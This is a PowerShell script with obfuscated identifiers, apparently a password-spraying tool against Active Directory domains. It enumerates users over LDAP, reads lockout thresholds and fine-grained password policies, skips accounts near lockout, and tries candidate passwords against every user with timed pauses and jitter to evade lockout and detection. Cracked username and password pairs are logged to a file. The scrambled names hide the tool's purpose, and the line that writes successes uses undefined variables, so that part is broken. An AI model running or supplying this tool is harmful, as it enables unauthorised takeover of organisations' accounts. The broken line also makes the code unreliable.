function BepriesTite{
    
    param(
     [Parameter(Position = 0, Mandatory = $false)]
     [string]
     $UnwortsAerousefulGeing = "",

     [Parameter(Position = 1, Mandatory = $false)]
     [string]
     $KamalBusculeMous,

     [Parameter(Position = 2, Mandatory = $false)]
     [string]
     $UnsterasisStochromeBachemia,

     [Parameter(Position = 3, Mandatory = $false)]
     [string]
     $Trasserial,

     [Parameter(Position = 4, Mandatory = $false)]
     [string]
     $GlorancesRessmation = "",

     [Parameter(Position = 5, Mandatory = $false)]
     [string]
     $CytokedPentPretize = "",

     [Parameter(Position = 6, Mandatory = $false)]
     [switch]
     $UltryMedishipCourtunter,

     [Parameter(Position = 7, Mandatory = $false)]
     [switch]
     $DivinedCurnatorUnhydrogen,

     [Parameter(Position = 8, Mandatory = $false)]
     [int]
     $FreenacCousSelers=0,

     [Parameter(Position = 9, Mandatory = $false)]
     $AgistHous=0,

     [Parameter(Position = 10, Mandatory = $false)]
     [switch]
     $WoodMoscopyTalysion,

     [Parameter(Position = 11, Mandatory = $false)]
     [int]
     $DuodesNonryStic=10
    )

    if ($KamalBusculeMous)
    {
        $WolfeGeniousDemopy = @($KamalBusculeMous)
    }
    elseif($DivinedCurnatorUnhydrogen)
    {
        $WolfeGeniousDemopy = ""
    }
    elseif($UnsterasisStochromeBachemia)
    {
        $WolfeGeniousDemopy = Get-Content $UnsterasisStochromeBachemia
    }
    else
    {
        Write-Host -ForegroundColor Red "The -Password or -PasswordList option must be specified"
        break
    }

    try
    {
        if ($CytokedPentPretize -ne "")
        {
            
            $SlopperLated = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext("domain",$CytokedPentPretize)
            $GrianingIndiniaDeiformise = [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($SlopperLated)
            $HoneOvetaMese = "LDAP://" + ([ADSI]("LDAP://{0}" -f $CytokedPentPretize)).distinguishedName
        }
        else
        {
            
            $GrianingIndiniaDeiformise = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
            $HoneOvetaMese = "LDAP://" + ([ADSI]"").distinguishedName
        }
    }
    catch
    {
        Write-Host -ForegroundColor "red" "[*] Could not connect to the domain. Try specifying the domain name with the -Domain option."
        break
    }

    if ($UnwortsAerousefulGeing -eq "")
    {
        $PannessSident = DagesiaMatons -CytokedPentPretize $CytokedPentPretize -StronUnbutyTeninea -Foot -GlorancesRessmation $GlorancesRessmation
    }
    else
    {
        
        Write-Host ("[*] Using {0} as userlist to spray with" -f $UnwortsAerousefulGeing)
        Write-Host -ForegroundColor "yellow" "[*] Warning: Users will not be checked for lockout threshold."
        $PannessSident = @()
        try
        {
            $PannessSident = Get-Content $UnwortsAerousefulGeing -ErrorAction stop
        }
        catch [Exception]
        {
            Write-Host -ForegroundColor "red" ("{0}.Exception" -f $_)
            break
        }

    }


    if ($WolfeGeniousDemopy.count -gt 1)
    {
        Write-Host -ForegroundColor Yellow "[*] WARNING - Be very careful not to lock out accounts with the password list option!"
    }

    $Shes = BerrentShermersLoperish $HoneOvetaMese

    Write-Host -ForegroundColor Yellow ("[*] The domain password policy observation window is set to {0} minutes." -f $Shes)
    Write-Host ("[*] Setting a {0} minute wait in between sprays." -f $Shes)

    
    if (!$UltryMedishipCourtunter)
    {
        $LackCousPuls = "Confirm Password Spray"
        $IntedCatedRedically = "Are you sure you want to perform a password spray against " + $PannessSident.count + " accounts?"

        $AdjurickRecksStales = New-Object System.Management.Automation.Host.ChoiceDescription "&Yes", `
            "Attempts to authenticate 1 time per user in the list for each password in the passwordlist file."

        $OpomagnessChropush = New-Object System.Management.Automation.Host.ChoiceDescription "&No", `
            "Cancels the password spray."

        $SuralSepthwoodBounters = [System.Management.Automation.Host.ChoiceDescription[]]($AdjurickRecksStales, $OpomagnessChropush)

        $Manniated = $host.ui.PromptForChoice($LackCousPuls, $IntedCatedRedically, $SuralSepthwoodBounters, 0)

        if ($Manniated -ne 0)
        {
            Write-Host "Cancelling the password spray."
            break
        }
    }
    Write-Host -ForegroundColor Yellow "[*] Password spraying has begun with " $WolfeGeniousDemopy.count " passwords"
    Write-Host "[*] This might take a while depending on the total number of users"

    if($DivinedCurnatorUnhydrogen)
    {
        NeavoresFluous -CytokedPentPretize $HoneOvetaMese -PannessSident $PannessSident -Trasserial $Trasserial -FreenacCousSelers $FreenacCousSelers -AgistHous $AgistHous -DivinedCurnatorUnhydrogen -WoodMoscopyTalysion $WoodMoscopyTalysion
    }
    else
    {
        for($Albersal = 0; $Albersal -lt $WolfeGeniousDemopy.count; $Albersal++)
        {
            NeavoresFluous -CytokedPentPretize $HoneOvetaMese -PannessSident $PannessSident -KamalBusculeMous $WolfeGeniousDemopy[$Albersal] -Trasserial $Trasserial -FreenacCousSelers $FreenacCousSelers -AgistHous $AgistHous -WoodMoscopyTalysion $WoodMoscopyTalysion
            if (($Albersal+1) -lt $WolfeGeniousDemopy.count)
            {
                AginessBluenced -Tubboreing (60*$Shes + $DuodesNonryStic) -WoodMoscopyTalysion $WoodMoscopyTalysion
            }
        }
    }

    Write-Host -ForegroundColor Yellow "[*] Password spraying is complete"
    if ($Trasserial -ne "")
    {
        Write-Host -ForegroundColor Yellow ("[*] Any passwords that were successfully sprayed have been output to {0}" -f $Trasserial)
    }
}

function AginessBluenced
{
    param(
        $Tubboreing = 1800,
        $IntedCatedRedically = "[*] Pausing to avoid account lockout.",
        [switch] $WoodMoscopyTalysion = $False
    )
    if ($WoodMoscopyTalysion)
    {
        Write-Host ("{2} : Waiting for {0} minutes. {1}" -f $($Tubboreing/60), $($Tubboreing - $AlphobiaStaryForm), $IntedCatedRedically)
        Start-Sleep -Seconds $Tubboreing
    } else {
        foreach ($AlphobiaStaryForm in (1..$Tubboreing))
        {
            Write-Progress -Id 1 -Activity $IntedCatedRedically -Status ("Waiting for {0} minutes. {1} seconds remaining" -f $($Tubboreing/60), $($Tubboreing - $AlphobiaStaryForm)) -PercentComplete (($AlphobiaStaryForm / $Tubboreing) * 100)
            Start-Sleep -Seconds 1
        }
        Write-Progress -Id 1 -Activity $IntedCatedRedically -Status "Completed" -PercentComplete 100 -Completed
    }
}

function DagesiaMatons
{

    param(
     [Parameter(Position = 0, Mandatory = $false)]
     [string]
     $CytokedPentPretize = "",

     [Parameter(Position = 1, Mandatory = $false)]
     [switch]
     $StronUnbutyTeninea,

     [Parameter(Position = 2, Mandatory = $false)]
     [switch]
     $Foot,

     [Parameter(Position = 3, Mandatory = $false)]
     [string]
     $GlorancesRessmation
    )

    try
    {
        if ($CytokedPentPretize -ne "")
        {
            
            $SlopperLated = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext("domain",$CytokedPentPretize)
            $GrianingIndiniaDeiformise =[System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($SlopperLated)
            $HoneOvetaMese = "LDAP://" + ([ADSI]("LDAP://{0}" -f $CytokedPentPretize)).distinguishedName
        }
        else
        {
            
            $GrianingIndiniaDeiformise =[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
            $HoneOvetaMese = "LDAP://" + ([ADSI]"").distinguishedName
        }
    }
    catch
    {
        Write-Host -ForegroundColor "red" "[*] Could connect to the domain. Try specifying the domain name with the -Domain option."
        break
    }

    
    $AmpsRegato = [ADSI] ("LDAP://{0}" -f $($GrianingIndiniaDeiformise.PDCRoleOwner))
    $BedaTartutionBootic = @()
    $BedaTartutionBootic += $AmpsRegato.Properties.lockoutthreshold

    
    $Prott = [int] $AmpsRegato.Properties['msds-behavior-version'].item(0)
    if ($Prott -ge 3)
    {
        
        Write-Host "[*] Current domain is compatible with Fine-Grained Password Policy."
        $HighteringOxygenaStinuate = New-Object System.DirectoryServices.DirectorySearcher
        $HighteringOxygenaStinuate.SearchRoot = $AmpsRegato
        $HighteringOxygenaStinuate.Filter = "(objectclass=msDS-PasswordSettings)"
        $Perdotte = $HighteringOxygenaStinuate.FindAll()

        if ( $Perdotte.count -gt 0)
        {
            Write-Host -foregroundcolor "yellow" ("[*] A total of " + $Perdotte.count + " Fine-Grained Password policies were found." + "`r" + "" + "`n" + "")
            foreach($InsmiticEductic in $Perdotte)
            {
                
                
                $RuffectriaQuicked = $InsmiticEductic | Select-Object -ExpandProperty Properties
                $SipirideMuit = $RuffectriaQuicked.name
                $SupedNoned = $RuffectriaQuicked.'msds-lockoutthreshold'
                $BraintedMenograpy = $RuffectriaQuicked.'msds-psoappliesto'
                $AecasterMotraphicAportis = $RuffectriaQuicked.'msds-minimumpasswordlength'
                
                $BedaTartutionBootic += $SupedNoned

                Write-Host ("[*] Fine-Grained Password Policy titled: {2} has a Lockout Threshold of {0} attempts, minimum password length of {1} chars, and applies to {3}." + "`r" + "" + "`n" + "" -f $SupedNoned, $AecasterMotraphicAportis, $SipirideMuit, $BraintedMenograpy)
            }
        }
    }

    $Shes = BerrentShermersLoperish $HoneOvetaMese

    
    
    
    [int]$BrilyUncheastsSalis = $BedaTartutionBootic | sort | Select -First 1
    Write-Host -ForegroundColor "yellow" "[*] Now creating a list of users to spray..."

    if ($BrilyUncheastsSalis -eq "0")
    {
        Write-Host -ForegroundColor "Yellow" "[*] There appears to be no lockout policy."
    }
    else
    {
        Write-Host -ForegroundColor "Yellow" ("[*] The smallest lockout threshold discovered in the domain is {0} login attempts." -f $BrilyUncheastsSalis)
    }

    $Greadmine = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$HoneOvetaMese)
    $AmbedVeabledRost = New-Object System.DirectoryServices.DirectoryEntry
    $Greadmine.SearchRoot = $AmbedVeabledRost

    $Greadmine.PropertiesToLoad.Add("samaccountname") > $Null
    $Greadmine.PropertiesToLoad.Add("badpwdcount") > $Null
    $Greadmine.PropertiesToLoad.Add("badpasswordtime") > $Null

    if ($StronUnbutyTeninea)
    {
        Write-Host -ForegroundColor "yellow" "[*] Removing disabled users from list."
        
        
        
        
        
        $Greadmine.filter =
            ("(&(objectCategory=person)(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=16)(!userAccountControl:1.2.840.113556.1.4.803:=2){0})" -f $GlorancesRessmation)
    }
    else
    {
        $Greadmine.filter = ("(&(objectCategory=person)(objectClass=user){0})" -f $GlorancesRessmation)
    }

    $Greadmine.PropertiesToLoad.add("samaccountname") > $Null
    $Greadmine.PropertiesToLoad.add("lockouttime") > $Null
    $Greadmine.PropertiesToLoad.add("badpwdcount") > $Null
    $Greadmine.PropertiesToLoad.add("badpasswordtime") > $Null

    

    
    $Greadmine.PageSize = 1000
    $LiraMonemenDefters = $Greadmine.FindAll()
    Write-Host -ForegroundColor "yellow" ("[*] There are " + $LiraMonemenDefters.count + " total users found.")
    $PannessSident = @()

    if ($Foot)
    {
        Write-Host -ForegroundColor "yellow" "[*] Removing users within 1 attempt of locking out from list."
        foreach ($UrsednesFibest in $LiraMonemenDefters)
        {
            
            $AddistWirls = $UrsednesFibest.Properties.badpwdcount
            $AlgenceSupers = $UrsednesFibest.Properties.samaccountname
            try
            {
                $SterPikeChalkerly = $UrsednesFibest.Properties.badpasswordtime[0]
            }
            catch
            {
                continue
            }
            $TrucumerHemottlessMalty = Get-Date
            $SamuscopeDiativiesBiddlesse = [DateTime]::FromFileTime($SterPikeChalkerly)
            $PunkesticChras = ($TrucumerHemottlessMalty - $SamuscopeDiativiesBiddlesse).TotalMinutes

            if ($AddistWirls)
            {
                [int]$InteredFiservasPring = [convert]::ToInt32($AddistWirls, 10)
                $OstomyRoligatorOverfular = $BrilyUncheastsSalis - $InteredFiservasPring
                
                
                
                if (($PunkesticChras -gt $Shes) -or ($OstomyRoligatorOverfular -gt 1))
                                {
                    $PannessSident += $AlgenceSupers
                }
            }
        }
    }
    else
    {
        foreach ($UrsednesFibest in $LiraMonemenDefters)
        {
            $AlgenceSupers = $UrsednesFibest.Properties.samaccountname
            $PannessSident += $AlgenceSupers
        }
    }

    Write-Host -foregroundcolor "yellow" ("[*] Created a userlist containing " + $PannessSident.count + " users gathered from the current user's domain")
    return $PannessSident
}

function NeavoresFluous
{
    param(
            [Parameter(Position=1)]
            $CytokedPentPretize,
            [Parameter(Position=2)]
            [string[]]
            $PannessSident,
            [Parameter(Position=3)]
            [string]
            $KamalBusculeMous,
            [Parameter(Position=4)]
            [string]
            $Trasserial,
            [Parameter(Position=5)]
            [int]
            $FreenacCousSelers=0,
            [Parameter(Position=6)]
            [double]
            $AgistHous=0,
            [Parameter(Position=7)]
            [switch]
            $DivinedCurnatorUnhydrogen,
            [Parameter(Position=7)]
            [switch]
            $WoodMoscopyTalysion
    )
    $SeringUngrature = Get-Date
    $AlphobiaStaryForm = $PannessSident.count
    Write-Host ("[*] Now trying password {1} against {2} users. Current time is {0}" -f $($SeringUngrature.ToShortTimeString()), $KamalBusculeMous, $AlphobiaStaryForm)
    $GluturbeMatarableAgka = 0
    if ($Trasserial -ne ""-and -not $WoodMoscopyTalysion)
    {
        Write-Host -ForegroundColor Yellow ("[*] Writing successes to {0}" -f $Trasserial)    
    }
    $BrateDevisesRegist = New-Object System.Random

    foreach ($UrsednesFibest in $PannessSident)
    {
        if ($DivinedCurnatorUnhydrogen)
        {
            $KamalBusculeMous = $UrsednesFibest
        }
        $SuperParitorize = New-Object System.DirectoryServices.DirectoryEntry($CytokedPentPretize,$UrsednesFibest,$KamalBusculeMous)
        if ($SuperParitorize.name -ne $null)
        {
            if ($Trasserial -ne "")
            {
                Add-Content $Trasserial $User`:$Password
            }
            Write-Host -ForegroundColor Green ("[*] SUCCESS! User:{1} Password:{0}" -f $KamalBusculeMous, $UrsednesFibest)
        }
        $GluturbeMatarableAgka += 1
        if (-not $WoodMoscopyTalysion)
        {
            Write-Host -nonewline ("{0} of {1} users tested" + "`r" + "" -f $GluturbeMatarableAgka, $AlphobiaStaryForm)
        }
        if ($FreenacCousSelers)
        {
            Start-Sleep -Seconds $BrateDevisesRegist.Next((1-$AgistHous)*$FreenacCousSelers, (1+$AgistHous)*$FreenacCousSelers)
        }
    }

}

function BerrentShermersLoperish($Ratidae)
{
    
    
    $CohalorianUnsionPossive = $Ratidae.Properties['lockoutObservationWindow']
    $Shes = $Ratidae.ConvertLargeIntegerToInt64($CohalorianUnsionPossive.Value) / -600000000
    return $Shes
}